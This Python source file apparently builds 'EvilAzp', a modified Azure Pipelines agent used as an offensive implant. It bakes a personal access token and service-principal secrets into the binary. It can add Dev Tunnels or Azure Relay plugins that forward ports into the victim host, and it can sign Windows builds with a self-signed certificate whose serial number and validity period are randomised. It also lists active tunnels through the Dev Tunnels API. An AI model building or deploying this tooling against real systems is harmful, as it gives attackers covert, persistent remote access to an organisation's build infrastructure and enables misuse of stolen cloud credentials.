"""Build and bake the bundled EvilAzp Azure Pipelines agent.

This module owns the operator-facing agent build workflow. It writes
``BakedConfig.cs`` from a YAML config, optionally includes tunnel/relay
plugins, and invokes the repo-local Azure Pipelines Agent build.
"""

import argparse
import json
import os
import random
import secrets
import shutil
import subprocess
import textwrap
import tempfile
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path

AGENT_DIR = Path(__file__).resolve().parents[2] / "vendor" / "azure-pipelines-agent"
BAKED_CONFIG_PATH = AGENT_DIR / "src" / "Agent.Listener" / "BakedConfig.cs"
DEFAULT_YAML_PATH = AGENT_DIR / ".env"
DEFAULT_POLLING_SECONDS = 0
SUPPORTED_RUNTIMES = ("linux-x64", "linux-arm64", "win-x64", "osx-x64")
DEFAULT_SIGN_SUBJECT = "/CN=EvilAZP Self-Signed Code Signing"
DEFAULT_SIGN_NAME = "EvilAZP Agent"
DEFAULT_SIGN_URL = "https://github.com/project-agents/evilazp"
DEFAULT_TIMESTAMP_URL = "http://timestamp.digicert.com"

BAKED_CONFIG_TEMPLATE = textwrap.dedent("""\
    namespace Microsoft.VisualStudio.Services.Agent.Listener
    {{
        internal static class BakedConfig
        {{
            internal const string OrgUrl = "{org_url}";
            internal const string Pat = "{pat}";
            internal const string Pool = "{pool}";
            internal const string AgentName = "{agent}";
            internal static readonly int PollingSeconds = {polling_seconds};

            internal const string SpTenant = "{sp_tenant}";
            internal const string SpClient = "{sp_client}";
            internal const string SpSecret = "{sp_secret}";
            internal const string TunnelId = "{tunnel_id}";
            internal const string TunnelPorts = "{tunnel_ports}";

            internal const string AzureRelayConnectionString = "{relay_connection_string}";
            internal const string AzureRelayLocalForwards = "{relay_local_forwards}";
            internal const string AzureRelayRemoteForwards = "{relay_remote_forwards}";
            internal const string AzureRelayRemoteHttpForwards = "{relay_remote_http_forwards}";

            internal static bool HasAgentConfig =>
                !string.IsNullOrEmpty(OrgUrl) && !string.IsNullOrEmpty(Pat) &&
                !string.IsNullOrEmpty(Pool) && !string.IsNullOrEmpty(AgentName);

            internal static bool HasTunnelConfig =>
                !string.IsNullOrEmpty(SpTenant) && !string.IsNullOrEmpty(SpClient) &&
                !string.IsNullOrEmpty(SpSecret) && !string.IsNullOrEmpty(TunnelPorts);

            internal static bool HasAzureRelayConfig =>
                !string.IsNullOrEmpty(AzureRelayConnectionString) &&
                (!string.IsNullOrEmpty(AzureRelayLocalForwards) ||
                 !string.IsNullOrEmpty(AzureRelayRemoteForwards) ||
                 !string.IsNullOrEmpty(AzureRelayRemoteHttpForwards));
        }}
    }}
""")

BUILD_CMD = [
    "dotnet", "msbuild", "src/dir.proj",
    "/t:SingleBinary",
    "/p:BUILDCONFIG=Release",
    "/p:TargetFramework=net8.0",
]

CONFIG_FIELDS = (
    "url",
    "pat",
    "pool",
    "agent",
    "sp_tenant",
    "sp_client",
    "sp_secret",
    "tunnel_id",
    "tunnel_ports",
    "relay_connection_string",
    "relay_local_forward",
    "relay_remote_forward",
    "relay_remote_http_forward",
    "azure_files_account",
    "azure_files_sas",
    "azure_files_account_key",
)

# Operator config comes from YAML only. Build-time feature toggles can still be
# supplied as CLI flags, but credentials and forwarding rules must be declared
# in the YAML config so builds are repeatable.
YAML_KEY_ALIASES = {
    "org": "url",
    "org_url": "url",
    "organization": "url",
    "sp-tenant": "sp_tenant",
    "sp_tenant": "sp_tenant",
    "sp-tenant-id": "sp_tenant",
    "tenant": "sp_tenant",
    "tenant-id": "sp_tenant",
    "tenant_id": "sp_tenant",
    "sp-client": "sp_client",
    "sp_client": "sp_client",
    "sp-client-id": "sp_client",
    "sp_client_id": "sp_client",
    "client": "sp_client",
    "client-id": "sp_client",
    "client_id": "sp_client",
    "sp-secret": "sp_secret",
    "sp_secret": "sp_secret",
    "client-secret": "sp_secret",
    "client_secret": "sp_secret",
    "secret": "sp_secret",
    "tunnel-id": "tunnel_id",
    "tunnel_id": "tunnel_id",
    "tunnel-name": "tunnel_id",
    "tunnel_name": "tunnel_id",
    "tunnel-ports": "tunnel_ports",
    "tunnel_ports": "tunnel_ports",
    "relay-connection-string": "relay_connection_string",
    "relay_connection_string": "relay_connection_string",
    "relay-local-forward": "relay_local_forward",
    "relay_local_forward": "relay_local_forward",
    "relay-remote-forward": "relay_remote_forward",
    "relay_remote_forward": "relay_remote_forward",
    "relay-remote-http-forward": "relay_remote_http_forward",
    "relay_remote_http_forward": "relay_remote_http_forward",
    "azure-files-account": "azure_files_account",
    "azure_files_account": "azure_files_account",
    "azure-files-sas": "azure_files_sas",
    "azure_files_sas": "azure_files_sas",
    "azure-files-account-key": "azure_files_account_key",
    "azure_files_account_key": "azure_files_account_key",
}

LIST_FIELDS = {"relay_local_forward", "relay_remote_forward", "relay_remote_http_forward"}


class AgentBuilderError(RuntimeError):
    """Raised when baking or building the bundled agent fails."""


@dataclass(frozen=True)
class AgentBuildResult:
    """Result metadata for a successful agent build."""

    binary: Path
    layout_dir: Path
    runtime: str
    tunnel_enabled: bool
    relay_enabled: bool


@dataclass(frozen=True)
class AgentBuildConfig:
    """Complete build inputs after CLI or shell options have been resolved."""

    url: str
    pat: str
    pool: str
    agent: str
    runtime: str = "win-x64"
    tunnel: bool = False
    relay: bool = False
    polling: int = DEFAULT_POLLING_SECONDS
    sp_tenant: str = ""
    sp_client: str = ""
    sp_secret: str = ""
    tunnel_id: str = ""
    tunnel_ports: str = ""
    relay_connection_string: str = ""
    relay_local_forward: tuple[str, ...] = ()
    relay_remote_forward: tuple[str, ...] = ()
    relay_remote_http_forward: tuple[str, ...] = ()
    sign: bool = False
    pfx: str = ""
    pfx_pass: str = ""
    pfx_pass_env: str = "EVILAZP_PFX_PASS"
    timestamp: str = DEFAULT_TIMESTAMP_URL
    sign_name: str = DEFAULT_SIGN_NAME
    sign_url: str = DEFAULT_SIGN_URL
    cert_subject: str = DEFAULT_SIGN_SUBJECT


def csharp_string(value):
    """Escape values before writing them as C# string constants."""

    value = value or ""
    return value.replace("\\", "\\\\").replace('"', '\\"').replace("\r", "\\r").replace("\n", "\\n")


def join_multi(values):
    return "|".join(values or [])


def split_multi(value):
    """Read multi-value fields from YAML lists or BakedConfig pipe strings."""

    if value is None or value == "":
        return []
    if isinstance(value, list):
        return [str(item) for item in value if str(item)]
    return [item for item in str(value).split("|") if item]


def load_yaml_config(path):
    """Load an operator config file without requiring PyYAML at runtime."""

    path = resolve_yaml_path(path)
    if not os.path.exists(path):
        raise ValueError(f"YAML config file not found: {path}")
    with open(path) as f:
        text = f.read()
    try:
        import yaml  # type: ignore
    except ImportError:
        raw = _parse_simple_yaml(text)
    else:
        raw = yaml.safe_load(text) or {}
    if not isinstance(raw, dict):
        raise ValueError(f"YAML config must be a key/value object: {path}")
    return normalize_config(raw)


def resolve_yaml_path(path):
    """Return the explicit YAML path or the bundled agent's default .env."""

    if path in (None, "", True, "true"):
        return str(DEFAULT_YAML_PATH)
    return str(path)


def _parse_simple_yaml(text):
    """Parse the small YAML subset used by `.env` config files.

    The builder should work on clean operator machines, so PyYAML is optional.
    This fallback intentionally supports only flat key/value pairs and simple
    lists, which keeps secret parsing predictable.
    """

    result = {}
    current_key = None
    for raw_line in text.splitlines():
        line = raw_line.rstrip()
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        if stripped.startswith("- "):
            if not current_key:
                raise ValueError("YAML list item found before a key")
            result.setdefault(current_key, []).append(_unquote(stripped[2:].strip()))
            continue
        if ":" not in line:
            raise ValueError(f"invalid YAML line: {line}")
        key, value = line.split(":", 1)
        current_key = key.strip()
        value = value.strip()
        if value == "":
            result[current_key] = []
            continue
        result[current_key] = _parse_yaml_scalar(value)
    return result


def _parse_yaml_scalar(value):
    value = _unquote(value)
    if value.startswith("[") and value.endswith("]"):
        inner = value[1:-1].strip()
        if not inner:
            return []
        return [_unquote(item.strip()) for item in inner.split(",")]
    return value


def _unquote(value):
    if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
        return value[1:-1]
    return value


def normalize_config(raw):
    """Normalize YAML aliases into argparse field names."""

    config = {}
    for key, value in raw.items():
        normalized_key = YAML_KEY_ALIASES.get(str(key).strip().replace("_", "-"), str(key).strip().replace("-", "_"))
        if normalized_key not in CONFIG_FIELDS:
            continue
        if normalized_key in LIST_FIELDS:
            config[normalized_key] = split_multi(value)
        else:
            config[normalized_key] = "" if value is None else str(value)
    return config


def require_fields(args, fields, source):
    """Raise one compact error listing every missing required value."""

    missing = [field for field in fields if getattr(args, field, None) in (None, "", [])]
    if missing:
        names = ", ".join(field for field in missing)
        raise ValueError(f"{source}에 누락된 값이 있습니다: {names}")


def add_config_args(parser, *, include_required_help=False):
    """Attach the shared YAML config option."""

    parser.add_argument(
        "--yaml",
        dest="yaml_path",
        nargs="?",
        const=str(DEFAULT_YAML_PATH),
        required=True,
        help=f"YAML config file; omit the value to use {DEFAULT_YAML_PATH}",
    )
    if include_required_help:
        parser.epilog = "All credentials and forwarding rules must come from --yaml."


def add_polling_arg(parser):
    """Attach the optional baked no-job polling delay."""

    parser.add_argument(
        "--polling",
        type=int,
        default=DEFAULT_POLLING_SECONDS,
        help="fixed seconds to wait after an empty job poll; omit to keep the default random 5-15s delay",
    )


def prepare_bake_config(args, *, source):
    """Validate one complete bake configuration before writing secrets."""

    require_fields(args, ("url", "pat", "pool", "agent"), source)
    if hasattr(args, "runtime"):
        validate_runtime(args.runtime)
    validate_polling(args.polling)
    sp_values = [args.sp_tenant, args.sp_client, args.sp_secret]
    if args.tunnel_ports or args.tunnel_id:
        require_fields(args, ("sp_tenant", "sp_client", "sp_secret", "tunnel_ports"), source)
    elif any(sp_values) and not all(sp_values):
        require_fields(args, ("sp_tenant", "sp_client", "sp_secret"), source)

    relay_forwards = (args.relay_local_forward or []) + (args.relay_remote_forward or []) + (args.relay_remote_http_forward or [])
    if args.relay_connection_string or relay_forwards:
        if not args.relay_connection_string or not relay_forwards:
            raise ValueError(f"{source}에 누락된 값이 있습니다: relay_connection_string and at least one relay forward")
        validate_relay_forwards(args)


def load_config_for_command(args, *, parser):
    """Load the authoritative YAML config directly onto parsed argparse args."""

    args.yaml_path = resolve_yaml_path(args.yaml_path)
    try:
        config = load_yaml_config(args.yaml_path)
    except ValueError as exc:
        if parser:
            parser.error(str(exc))
        raise

    for field in CONFIG_FIELDS:
        setattr(args, field, [] if field in LIST_FIELDS else None)

    for field in CONFIG_FIELDS:
        value = config.get(field)
        if value not in (None, "", []):
            setattr(args, field, value)

    return f"YAML 설정 파일 '{args.yaml_path}'"


def validate_relay_local_forward(value):
    if ":" not in value:
        raise ValueError(f"invalid relay_local_forward '{value}': expected <local-port>:<hybrid-connection>")
    left, relay_name = value.rsplit(":", 1)
    if not relay_name:
        raise ValueError(f"invalid relay_local_forward '{value}': missing hybrid connection name")
    port = left.rsplit(":", 1)[-1].split("/", 1)[0].removesuffix("U")
    if port and port.isdigit() and 1 <= int(port) <= 65535:
        return
    raise ValueError(f"invalid relay_local_forward '{value}': local port must be 1-65535")


def validate_relay_remote_forward(value):
    parts = value.split(":")
    if len(parts) < 3:
        raise ValueError(f"invalid relay_remote_forward '{value}': expected <hybrid-connection>:<target-host>:<target-port>")
    relay_name = parts[0]
    target_port = parts[-1]
    target_host = ":".join(parts[1:-1])
    if not relay_name:
        raise ValueError(f"invalid relay_remote_forward '{value}': missing hybrid connection name")
    if not target_host:
        raise ValueError(f"invalid relay_remote_forward '{value}': missing target host")
    if not target_port.isdigit() or not 1 <= int(target_port) <= 65535:
        raise ValueError(f"invalid relay_remote_forward '{value}': target port must be 1-65535")


def validate_relay_remote_http_forward(value):
    if ":" not in value:
        raise ValueError(f"invalid relay_remote_http_forward '{value}': expected <hybrid-connection>:http/<host>:<port>")
    relay_name, target = value.split(":", 1)
    if not relay_name:
        raise ValueError(f"invalid relay_remote_http_forward '{value}': missing hybrid connection name")
    if not (target.startswith("http/") or target.startswith("https/")):
        raise ValueError(f"invalid relay_remote_http_forward '{value}': target must start with http/ or https/")


def validate_relay_forwards(args):
    for value in args.relay_local_forward or []:
        validate_relay_local_forward(value)
    for value in args.relay_remote_forward or []:
        validate_relay_remote_forward(value)
    for value in args.relay_remote_http_forward or []:
        validate_relay_remote_http_forward(value)


def validate_requested_build_features(args, *, source):
    if args.tunnel:
        require_fields(args, ("sp_tenant", "sp_client", "sp_secret", "tunnel_ports"), source)

    relay_forwards = (args.relay_local_forward or []) + (args.relay_remote_forward or []) + (args.relay_remote_http_forward or [])
    if args.relay and (not args.relay_connection_string or not relay_forwards):
        raise ValueError(f"{source}에 Azure Relay 값이 없습니다: relay_connection_string and at least one relay forward")


def validate_polling(value):
    """Validate the optional fixed no-job polling delay baked into the agent."""

    if value is None:
        return DEFAULT_POLLING_SECONDS
    if isinstance(value, str):
        value = int(value)
    if value == DEFAULT_POLLING_SECONDS:
        return DEFAULT_POLLING_SECONDS
    if value < 1:
        raise ValueError("--polling must be 1 or greater")
    return value


def validate_runtime(value):
    """Validate the target runtime before invoking msbuild."""

    if value not in SUPPORTED_RUNTIMES:
        allowed = ", ".join(SUPPORTED_RUNTIMES)
        raise ValueError(f"invalid runtime: {value}; expected one of {allowed}")
    return value


def args_from_config(config: AgentBuildConfig) -> argparse.Namespace:
    """Convert a typed config into the namespace expected by legacy helpers."""

    return argparse.Namespace(
        url=config.url,
        pat=config.pat,
        pool=config.pool,
        agent=config.agent,
        runtime=config.runtime,
        tunnel=config.tunnel,
        relay=config.relay,
        polling=config.polling,
        sp_tenant=config.sp_tenant,
        sp_client=config.sp_client,
        sp_secret=config.sp_secret,
        tunnel_id=config.tunnel_id,
        tunnel_ports=config.tunnel_ports,
        relay_connection_string=config.relay_connection_string,
        relay_local_forward=list(config.relay_local_forward),
        relay_remote_forward=list(config.relay_remote_forward),
        relay_remote_http_forward=list(config.relay_remote_http_forward),
        sign=config.sign,
        pfx=config.pfx,
        pfx_pass=config.pfx_pass,
        pfx_pass_env=config.pfx_pass_env,
        timestamp=config.timestamp,
        sign_name=config.sign_name,
        sign_url=config.sign_url,
        cert_subject=config.cert_subject,
    )


def bake_from_config(config: AgentBuildConfig, *, quiet: bool = False) -> None:
    """Bake BakedConfig.cs from a resolved config object."""

    args = args_from_config(config)
    prepare_bake_config(args, source="agent config")
    bake(args, quiet=quiet)


def build_from_config(config: AgentBuildConfig, *, quiet: bool = False) -> AgentBuildResult:
    """Bake and build the bundled agent from a resolved config object."""

    args = args_from_config(config)
    prepare_bake_config(args, source="agent config")
    validate_requested_build_features(args, source="agent config")
    bake(args, quiet=quiet)
    return build(args, quiet=quiet)


def build_args_from_yaml(
    yaml_path: str,
    *,
    runtime: str = "win-x64",
    tunnel: bool = False,
    relay: bool = False,
    polling: int = DEFAULT_POLLING_SECONDS,
) -> argparse.Namespace:
    """Create a validated build namespace from the shared YAML config."""

    args = argparse.Namespace(
        yaml_path=yaml_path,
        runtime=runtime,
        tunnel=tunnel,
        relay=relay,
        polling=polling,
    )
    source = load_config_for_command(args, parser=None)
    prepare_bake_config(args, source=source)
    validate_requested_build_features(args, source=source)
    return args


def bake_from_yaml(
    yaml_path: str,
    *,
    polling: int = DEFAULT_POLLING_SECONDS,
    quiet: bool = False,
) -> None:
    """Bake BakedConfig.cs from YAML without invoking the .NET build."""

    args = argparse.Namespace(yaml_path=yaml_path, polling=polling)
    source = load_config_for_command(args, parser=None)
    prepare_bake_config(args, source=source)
    bake(args, quiet=quiet)


def build_from_yaml(
    yaml_path: str,
    *,
    runtime: str = "win-x64",
    tunnel: bool = False,
    relay: bool = False,
    polling: int = DEFAULT_POLLING_SECONDS,
    sign: bool = False,
    pfx: str = "",
    pfx_pass: str = "",
    pfx_pass_env: str = "EVILAZP_PFX_PASS",
    timestamp: str = DEFAULT_TIMESTAMP_URL,
    sign_name: str = DEFAULT_SIGN_NAME,
    sign_url: str = DEFAULT_SIGN_URL,
    cert_subject: str = DEFAULT_SIGN_SUBJECT,
    quiet: bool = False,
) -> AgentBuildResult:
    """Bake config from YAML and build the bundled agent."""

    args = build_args_from_yaml(
        yaml_path,
        runtime=runtime,
        tunnel=tunnel,
        relay=relay,
        polling=polling,
    )
    args.sign = sign
    args.pfx = pfx
    args.pfx_pass = pfx_pass
    args.pfx_pass_env = pfx_pass_env
    args.timestamp = timestamp
    args.sign_name = sign_name
    args.sign_url = sign_url
    args.cert_subject = cert_subject
    bake(args, quiet=quiet)
    return build(args, quiet=quiet)


def bake(args, *, quiet: bool = False):
    org_url = args.url
    if not org_url.startswith("https://"):
        org_url = f"https://dev.azure.com/{org_url}"
    polling_seconds = validate_polling(args.polling)

    config = BAKED_CONFIG_TEMPLATE.format(
        org_url=csharp_string(org_url),
        pat=csharp_string(args.pat),
        pool=csharp_string(args.pool),
        agent=csharp_string(args.agent),
        polling_seconds=polling_seconds,
        sp_tenant=csharp_string(args.sp_tenant),
        sp_client=csharp_string(args.sp_client),
        sp_secret=csharp_string(args.sp_secret),
        tunnel_id=csharp_string(args.tunnel_id or (args.agent if args.tunnel_ports else "")),
        tunnel_ports=csharp_string(args.tunnel_ports),
        relay_connection_string=csharp_string(args.relay_connection_string),
        relay_local_forwards=csharp_string(join_multi(args.relay_local_forward)),
        relay_remote_forwards=csharp_string(join_multi(args.relay_remote_forward)),
        relay_remote_http_forwards=csharp_string(join_multi(args.relay_remote_http_forward)),
    )

    with open(BAKED_CONFIG_PATH, "w") as f:
        f.write(config)

    if not quiet:
        print_bake_summary(args, org_url, polling_seconds)


def print_bake_summary(args, org_url: str, polling_seconds: int) -> None:
    print(f"[*] Baked credentials into {BAKED_CONFIG_PATH}")
    print(f"    Org URL    : {org_url}")
    print(f"    PAT        : {args.pat[:8]}...{args.pat[-4:]}")
    print(f"    Pool       : {args.pool}")
    print(f"    Agent Name : {args.agent}")
    if polling_seconds:
        print(f"    Polling    : {polling_seconds}s fixed no-job delay")
    else:
        print("    Polling    : default random 5-15s no-job delay")
    if args.tunnel_ports:
        print(f"    SP Tenant  : {args.sp_tenant}")
        print(f"    SP Client  : {args.sp_client}")
        print(f"    SP Secret  : {args.sp_secret[:8]}...{args.sp_secret[-4:]}")
        print(f"    Tunnel ID   : {args.tunnel_id or args.agent}")
        print(f"    Tunnel Ports: {args.tunnel_ports}")
    elif args.sp_tenant:
        print("    Tunnel     : not configured (SP credentials baked, but --tunnel-ports was not set)")
    else:
        print("    Tunnel     : not configured (vanilla agent)")

    if args.relay_connection_string:
        print("    Azure Relay: configured")
        print(f"    Relay -L   : {join_multi(args.relay_local_forward) or '(none)'}")
        print(f"    Relay -T   : {join_multi(args.relay_remote_forward) or '(none)'}")
        print(f"    Relay -H   : {join_multi(args.relay_remote_http_forward) or '(none)'}")
    else:
        print("    Azure Relay: not configured")


def build(args, *, quiet: bool = False):
    runtime = args.runtime
    validate_runtime(runtime)
    layout_dir = AGENT_DIR / "_layout" / runtime
    enable_tunnel = args.tunnel
    enable_relay = args.relay

    version_file = AGENT_DIR / "src" / "agentversion"
    with open(version_file) as f:
        agent_version = f.read().strip()

    cmd = BUILD_CMD + [
        f"/p:PackageRuntime={runtime}",
        f"/p:AgentVersion={agent_version}",
        f"/p:LayoutRoot={layout_dir}",
        "/m:1",
    ]

    if enable_tunnel:
        cmd.append("/p:EnableTunnel=true")
    if enable_relay:
        clean_plugin_runtime_obj("Agent.Plugins.AzureRelayBridge", runtime)
        cmd.append("/p:EnableAzureRelayBridge=true")

    features = []
    if enable_tunnel:
        features.append("tunnel")
    if enable_relay:
        features.append("relay")
    label = "+".join(features) + "-enabled" if features else "vanilla"
    if not quiet:
        print(f"[*] Building {label} agent for {runtime}")
        print(f"    Output: {layout_dir}/single/Agent.Listener")

    result = subprocess.run(
        cmd,
        cwd=AGENT_DIR,
        capture_output=quiet,
        text=quiet,
    )
    if result.returncode != 0:
        raise AgentBuilderError(format_build_failure(result))

    out_dir = layout_dir / "single"
    binary_name = "Agent.Listener.exe" if runtime.startswith("win") else "Agent.Listener"
    binary = out_dir / binary_name
    if binary.exists():
        if getattr(args, "sign", False):
            sign_windows_binary(binary, args, quiet=quiet)
        size_mb = binary.stat().st_size / (1024 * 1024)
        if not quiet:
            print_build_success(binary, size_mb, enable_tunnel, enable_relay)
        return AgentBuildResult(
            binary=binary,
            layout_dir=layout_dir,
            runtime=runtime,
            tunnel_enabled=enable_tunnel,
            relay_enabled=enable_relay,
        )
    else:
        raise AgentBuilderError("binary not found after build")


def sign_windows_binary(binary: Path, args: argparse.Namespace, *, quiet: bool = False) -> None:
    """Authenticode-sign a Windows build output when requested."""

    if not str(getattr(args, "runtime", "")).startswith("win"):
        if not quiet:
            print("[*] --sign ignored for non-Windows runtime")
        return
    osslsigncode = shutil.which("osslsigncode")
    if not osslsigncode:
        raise AgentBuilderError("osslsigncode not found. Install it first, e.g. sudo apt install osslsigncode")

    temp_cert = None
    pfx = getattr(args, "pfx", "") or ""
    if pfx:
        pfx_path = Path(pfx)
        if not pfx_path.is_file():
            raise AgentBuilderError(f"PFX not found: {pfx}")
        password = getattr(args, "pfx_pass", "") or os.environ.get(getattr(args, "pfx_pass_env", "EVILAZP_PFX_PASS"))
        if password is None:
            raise AgentBuilderError(f"--pfx requires --pfx-pass or ${getattr(args, 'pfx_pass_env', 'EVILAZP_PFX_PASS')}")
    else:
        temp_cert, pfx_path, password = generate_self_signed_pfx(args, quiet=quiet)

    signed_path = binary.with_name(binary.name + ".signed")
    try:
        cmd = build_osslsigncode_command(osslsigncode, pfx_path, password, binary, signed_path, args, include_timestamp=True)
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0 and getattr(args, "timestamp", DEFAULT_TIMESTAMP_URL):
            if signed_path.exists():
                signed_path.unlink()
            if not quiet:
                print("[!] timestamp signing failed, retrying without timestamp")
            cmd = build_osslsigncode_command(osslsigncode, pfx_path, password, binary, signed_path, args, include_timestamp=False)
            result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise AgentBuilderError("osslsigncode failed: " + (result.stderr.strip() or result.stdout.strip()))
        os.replace(signed_path, binary)
        if not quiet:
            print(f"[*] Authenticode signed: {binary}")
    finally:
        if temp_cert:
            temp_cert.cleanup()
        if signed_path.exists():
            signed_path.unlink()


def build_osslsigncode_command(
    osslsigncode: str,
    pfx_path: Path,
    password: str,
    binary: Path,
    signed_path: Path,
    args: argparse.Namespace,
    *,
    include_timestamp: bool,
) -> list[str]:
    cmd = [
        osslsigncode,
        "sign",
        "-pkcs12",
        str(pfx_path),
        "-pass",
        password,
        "-h",
        "sha256",
        "-n",
        getattr(args, "sign_name", DEFAULT_SIGN_NAME),
        "-i",
        getattr(args, "sign_url", DEFAULT_SIGN_URL),
    ]
    timestamp = getattr(args, "timestamp", DEFAULT_TIMESTAMP_URL)
    if include_timestamp and timestamp:
        cmd.extend(["-ts", timestamp])
    cmd.extend(["-in", str(binary), "-out", str(signed_path)])
    return cmd


def generate_self_signed_pfx(args: argparse.Namespace, *, quiet: bool = False) -> tuple[tempfile.TemporaryDirectory, Path, str]:
    openssl = shutil.which("openssl")
    if not openssl:
        raise AgentBuilderError("openssl not found. Install it first, e.g. sudo apt install openssl")

    temp_dir = tempfile.TemporaryDirectory(prefix="evilazp-sign-")
    key_path = Path(temp_dir.name) / "cert.key"
    cert_path = Path(temp_dir.name) / "cert.pem"
    pfx_path = Path(temp_dir.name) / "cert.pfx"
    password = secrets.token_hex(12)
    serial = "0x" + secrets.token_hex(16)
    days = random.SystemRandom().randint(330, 420)

    req_cmd = [
        openssl,
        "req",
        "-newkey",
        "rsa:4096",
        "-nodes",
        "-x509",
        "-sha256",
        "-days",
        str(days),
        "-set_serial",
        serial,
        "-subj",
        getattr(args, "cert_subject", DEFAULT_SIGN_SUBJECT),
        "-addext",
        "keyUsage=digitalSignature",
        "-addext",
        "extendedKeyUsage=codeSigning",
        "-keyout",
        str(key_path),
        "-out",
        str(cert_path),
    ]
    result = subprocess.run(req_cmd, capture_output=True, text=True)
    if result.returncode != 0:
        temp_dir.cleanup()
        raise AgentBuilderError("openssl certificate generation failed: " + result.stderr.strip())

    pfx_cmd = [
        openssl,
        "pkcs12",
        "-export",
        "-out",
        str(pfx_path),
        "-inkey",
        str(key_path),
        "-in",
        str(cert_path),
        "-passout",
        "pass:" + password,
    ]
    result = subprocess.run(pfx_cmd, capture_output=True, text=True)
    if result.returncode != 0:
        temp_dir.cleanup()
        raise AgentBuilderError("openssl PFX export failed: " + result.stderr.strip())

    if not quiet:
        print(f"[*] Generated temporary self-signed signing cert ({serial}, {days} days)")
    return temp_dir, pfx_path, password


def clean_plugin_runtime_obj(plugin_name: str, runtime: str) -> None:
    """Remove runtime-specific intermediate output before optional plugin builds.

    Cross-runtime builds reuse the same project tree. If an earlier build left
    root-owned or stale files under obj, Roslyn can fail before it recompiles
    the plugin. Removing only the generated runtime obj directory keeps source
    files intact while making repeated `/agent create` calls deterministic.
    """

    obj_dir = AGENT_DIR / "src" / plugin_name / "obj" / "Release" / "net8.0" / runtime
    if not obj_dir.exists():
        return
    try:
        shutil.rmtree(obj_dir)
    except OSError as exc:
        raise AgentBuilderError(f"failed to clean {plugin_name} build cache: {exc}") from exc


def print_build_success(binary: Path, size_mb: float, enable_tunnel: bool, enable_relay: bool) -> None:
    print(f"\n[+] Build successful: {binary} ({size_mb:.0f} MB)")
    if enable_tunnel:
        print("    Tunnel plugin: INCLUDED")
    else:
        print("    Tunnel plugin: NOT included")
    if enable_relay:
        print("    Azure Relay Bridge plugin: INCLUDED")
    else:
        print("    Azure Relay Bridge plugin: NOT included")


def format_build_failure(result: subprocess.CompletedProcess) -> str:
    output = "\n".join(part for part in (getattr(result, "stdout", ""), getattr(result, "stderr", "")) if part)
    lines = [line.strip() for line in output.splitlines() if line.strip()]
    if not lines:
        return "agent build failed"
    errors = [line for line in lines if "error " in line.lower() or line.lower().startswith("error")]
    relevant = errors[-3:] or lines[-3:]
    return "agent build failed: " + " | ".join(relevant)


DEVTUNNELS_API = "https://global.rel.tunnels.api.visualstudio.com"
DEVTUNNELS_SCOPE = "46da2f7e-b5ef-422a-88d4-2a7f9de6a0b2/.default"


def get_entra_token(tenant_id, client_id, client_secret):
    url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
    data = urllib.parse.urlencode({
        "grant_type": "client_credentials",
        "client_id": client_id,
        "client_secret": client_secret,
        "scope": DEVTUNNELS_SCOPE,
    }).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    with urllib.request.urlopen(req, timeout=15) as resp:
        return json.loads(resp.read())["access_token"]


def tunnels(args):
    tenant = args.sp_tenant
    client = args.sp_client
    secret = args.sp_secret

    if not all([tenant, client, secret]):
        raise AgentBuilderError("YAML config must include sp_tenant, sp_client, and sp_secret.")

    token = get_entra_token(tenant, client, secret)

    req = urllib.request.Request(
        f"{DEVTUNNELS_API}/api/v1/tunnels?includePorts=true",
        headers={
            "Authorization": f"Bearer {token}",
            "Accept": "application/json",
            "User-Agent": "EvilAzp/1.0",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read())
    except urllib.error.HTTPError as e:
        raise AgentBuilderError(f"Dev Tunnels API error: {e.code} {e.read().decode()[:200]}") from e

    tunnels_list = data if isinstance(data, list) else data.get("value", [])
    if not tunnels_list:
        print("[*] No active tunnels found for this service principal.")
        return

    print(f"[*] {len(tunnels_list)} active tunnel(s):\n")
    for t in tunnels_list:
        tid = t.get("tunnelId", "?")
        cluster = t.get("clusterId", "?")
        ports = t.get("ports", [])
        status = t.get("status", {})
        host_conns = status.get("hostConnectionCount", 0)
        client_conns = status.get("clientConnectionCount", 0)
        created = t.get("created", "")
        labels = t.get("labels") or []
        aliases = [label.removeprefix("evilazp=") for label in labels if label.startswith("evilazp=")]

        print(f"    Tunnel   : {tid}.{cluster}")
        if aliases:
            print(f"    Alias    : {', '.join(aliases)}")
        print(f"    URL      : https://{tid}.{cluster}.devtunnels.ms")
        print(f"    Host     : {'connected' if host_conns else 'disconnected'} ({host_conns} conn)")
        print(f"    Clients  : {client_conns}")
        print(f"    Created  : {created}")
        if ports:
            print(f"    Ports    :")
            for p in ports:
                pnum = p.get("portNumber", "?")
                print(f"      {pnum} -> https://{tid}-{pnum}.{cluster}.devtunnels.ms")
        print()


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="EvilAzp Controller — bake credentials and build the modified Azure Pipeline Agent",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              evilazp-builder.py bake --yaml .env
              evilazp-builder.py build --yaml .env --runtime win-x64
              evilazp-builder.py build --yaml .env --relay --runtime win-x64
              evilazp-builder.py build --yaml .env --tunnel --runtime linux-x64

            Common runtimes:
              linux-x64, linux-arm64, win-x64, osx-x64
        """),
    )
    sub = parser.add_subparsers(dest="command", required=True)

    # --- bake ---
    p_bake = sub.add_parser("bake", help="Bake credentials into agent source code")
    add_config_args(p_bake, include_required_help=True)
    add_polling_arg(p_bake)

    # --- build ---
    p_build = sub.add_parser("build", help="Build the agent binary")
    p_build.add_argument("--tunnel", action="store_true", help="Include Dev Tunnels plugin")
    p_build.add_argument("--relay", action="store_true", help="Include Azure Relay Bridge plugin")
    p_build.add_argument(
        "--runtime",
        required=True,
        choices=SUPPORTED_RUNTIMES,
        help="Target runtime; must be specified explicitly",
    )
    p_build.add_argument("--sign", action="store_true", help="Authenticode-sign Windows output; auto-generates a temporary self-signed cert by default")
    p_build.add_argument("--pfx", default="", help="Optional PFX/PKCS#12 signing certificate")
    p_build.add_argument("--pfx-pass", dest="pfx_pass", default="", help="Optional PFX password")
    p_build.add_argument("--pfx-pass-env", default="EVILAZP_PFX_PASS", help="Environment variable containing optional PFX password")
